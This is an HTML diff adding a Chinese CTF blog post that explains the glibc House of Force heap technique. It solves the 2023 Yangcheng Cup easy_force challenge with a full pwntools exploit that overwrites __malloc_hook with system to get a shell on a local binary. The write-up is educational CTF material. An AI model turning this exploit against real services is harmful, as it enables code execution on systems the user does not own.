@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Sans Simplified Chinese:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"rjcnb666.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false,"announcement":{"enable":true}},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"enable","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+  <meta name="description" content="House of force条件： 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小  原理：利用malloc函数对top chunk的利用，使得堆块指向我们期望的地址，再次申请堆块就可以实现任意地址写。 源码:12345678910111213141516171819202122&#x2F;&#x2F; 获取当前的top chunk，并计算其对应的大小victim &#x3D; a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of force">
+<meta property="og:url" content="https://rjcnb666.github.io/2025/11/28/House%20of%20force/index.html">
+<meta property="og:site_name" content="mvegetable&#39;blog">
+<meta property="og:description" content="House of force条件： 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小  原理：利用malloc函数对top chunk的利用，使得堆块指向我们期望的地址，再次申请堆块就可以实现任意地址写。 源码:12345678910111213141516171819202122&#x2F;&#x2F; 获取当前的top chunk，并计算其对应的大小victim &#x3D; a">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122736424.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122801609.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127123220721.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/ye2.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125636159.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125941799.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125952099.png">
+<meta property="og:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127130158802.png">
+<meta property="article:published_time" content="2025-11-28T14:39:44.000Z">
+<meta property="article:modified_time" content="2025-11-28T16:30:24.016Z">
+<meta property="article:author" content="rjc">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122736424.png">
+
+<link rel="canonical" href="https://rjcnb666.github.io/2025/11/28/House%20of%20force/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>House of force | mvegetable'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">mvegetable'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">the world of pwn</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/11/28/House%20of%20force/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/tou.jpg">
+      <meta itemprop="name" content="rjc">
+      <meta itemprop="description" content="pangpangpang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mvegetable'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House of force
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-11-28 22:39:44" itemprop="dateCreated datePublished" datetime="2025-11-28T22:39:44+08:00">2025-11-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-11-29 00:30:24" itemprop="dateModified" datetime="2025-11-29T00:30:24+08:00">2025-11-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="far fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.6k</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><ol>
+<li>能够以溢出等方式控制到 top chunk 的 size 域</li>
+<li>能够自由地控制堆分配尺寸的大小</li>
+</ol>
+<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><strong>利用malloc函数对top chunk的利用，使得堆块指向我们期望的地址，再次申请堆块就可以实现任意地址写。</strong></p>
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码:"></a>源码:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line"><span class="comment">//nb是用户申请的堆块的大小加上头堆块 </span></span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    <span class="comment">// 新的top chunk的大小</span></span><br><span class="line">    remainder = chunk_at_offset(victim, nb)；</span><br><span class="line">    <span class="comment">//等价于remainder = (mchunkptr)((char*)victim + nb); 获取新的top chunk的地址</span></span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    <span class="comment">//更新top chunk地址</span></span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>只要满足把top chunk的size改成一个很大的值，就可以通过这个检测。</p>
+<p>一般把top chunk size的值改为-1 size是unsigned int类型就会变成0xffffffffffffffff  从而绕过检测。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;        <span class="comment">// &lt;=== 这里把top chunk的size域改为0xffffffffffffffff</span></span><br><span class="line">    <span class="built_in">malloc</span>(offset);  <span class="comment">// &lt;=== 减小top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);   <span class="comment">// &lt;=== 分配块实现任意地址写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的offset就是想控制top chunk移动后的位置。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">offset = target - <span class="number">0x10</span> <span class="comment">//nb</span></span><br><span class="line">       -=top </span><br><span class="line">    </span><br><span class="line"><span class="built_in">malloc</span>(offset) <span class="comment">// 此时new top chunk的头地址就会位于 target-0x10的位置</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>) <span class="comment">//实现任意地址写    </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里<code>offset</code>也可以是负数 （控制<code>topchunk</code>向低地址偏移）</p>
+<ul>
+<li><p>由于我们的<code>top chunk size</code>是-1 所以可以绕过检测。</p>
+</li>
+<li><p><code>new top chunk</code>的size我们不需要关系 重要的是<code>new top chunk</code>的地址 ,也就是：</p>
+<p><code>remainder = chunk_at_offset(victim, nb):</code></p>
+<p>这里我们的nb是一个负数  虽然转化成unsigned int类型会变成一个很大的正数 但是计算的时候会经过处理变成正常的加减法 就把他当成正常负数看就好。</p>
+</li>
+</ul>
+<h2 id="例题：2023-羊城杯决赛easy-force"><a href="#例题：2023-羊城杯决赛easy-force" class="headerlink" title="例题：2023 羊城杯决赛easy_force"></a>例题：2023 羊城杯决赛easy_force</h2><h3 id="main："><a href="#main：" class="headerlink" title="main："></a><strong>main：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122736424.png" alt="image-20251127122736424"></p>
+<h3 id="add"><a href="#add" class="headerlink" title="add:"></a><strong>add:</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127122801609.png" alt="image-20251127122801609"></p>
+<h3 id="保护："><a href="#保护：" class="headerlink" title="保护："></a><strong>保护：</strong></h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127123220721.png" alt="image-20251127123220721"></p>
+<p>这里只给了4次add函数的机会 ， 其他的函数都无用。</p>
+<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a><strong>思路：</strong></h3><p>通过house of force 把 malloc_hook 改成 system(\bin\sh)。</p>
+<h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a><strong>解题：</strong></h3><h4 id="首先通过mmap泄露libc基地址："><a href="#首先通过mmap泄露libc基地址：" class="headerlink" title="首先通过mmap泄露libc基地址："></a>首先通过<code>mmap</code>泄露<code>libc</code>基地址：</h4><p>在处理大 chunk 时的行为：<br>glibc 的 <code>malloc</code> 对于大于<code> mmap_threshold</code> 的申请，不使用 heap，而是直接调用 mmap() 向内核申请一块内存。<br>默认情况下，这个阈值在 128 KB 左右（也可能是更大）<br>(比如：<code>malloc(0x20000)</code> ➜ 会使用 <code>mmap</code>)</p>
+<p><code>mmap </code>分配的大 <code>chunk</code> 地址规律：</p>
+<p>使用<code>mmap()</code>分配的内存块，一般在 libc 映射地址之下；<br>在默认的内存布局中，<code>mmap()</code> 返回的地址和 libc.so 的加载基址存在一个固定偏移；</p>
+<p>申请一个超大 chunk（触发 <code>mmap</code>）<br>打印这个 chunk 的地址<br>减去偏移,得到 libc base</p>
+<p>这个偏移值是固定的（取决于特定 libc 版本的布局），你只要知道 libc 版本，就可以知道偏移量。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libc.address= <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)+<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/ye2.png" alt="Image #1"></p>
+<h4 id="修改topchunk-size"><a href="#修改topchunk-size" class="headerlink" title="修改topchunk  size:"></a>修改<code>topchunk</code>  size:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125636159.png" alt="image-20251127125636159"></p>
+<h4 id="计算偏移移动top-chunk到新位置"><a href="#计算偏移移动top-chunk到新位置" class="headerlink" title="计算偏移移动top chunk到新位置:"></a>计算偏移移动<code>top chunk</code>到新位置:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">// <span class="number">0x20</span>的偏移通过调试获得</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125941799.png" alt="image-20251127125941799"></p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125952099.png" alt="image-20251127125952099"></p>
+<p>这里可以看到new top 被移动到了malloc_hook - 0x10的位置。</p>
+<p>这样我们就可以进行任意地址写 覆写malloc_hook的地址了</p>
+<h4 id="写入system："><a href="#写入system：" class="headerlink" title="写入system："></a>写入system：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到<code>new topchunk</code> 切割了一块0x20大小的堆块给返回给用户</p>
+<p>我们从这里写入了system的地址</p>
+<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127130158802.png" alt="image-20251127130158802"></p>
+<p>后面再次利用malloc函数就可以实现打通。</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io= process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;now what to write?\n&quot;</span>,content)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libcc = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc.address= libcc +<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc :&quot;</span> + <span class="built_in">hex</span>(libcc))</span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system :&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(top))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>house of force 的关键在于可以修改<code>topchunk</code>的size部分 以及 计算好到target目标地址的偏移量。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem('bin%20sh'))/index.html">https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem(&#39;bin%20sh&#39;))/index.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/12/gdb/" rel="prev" title="gdb新的理解">
+      <i class="fa fa-chevron-left"></i> gdb新的理解
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
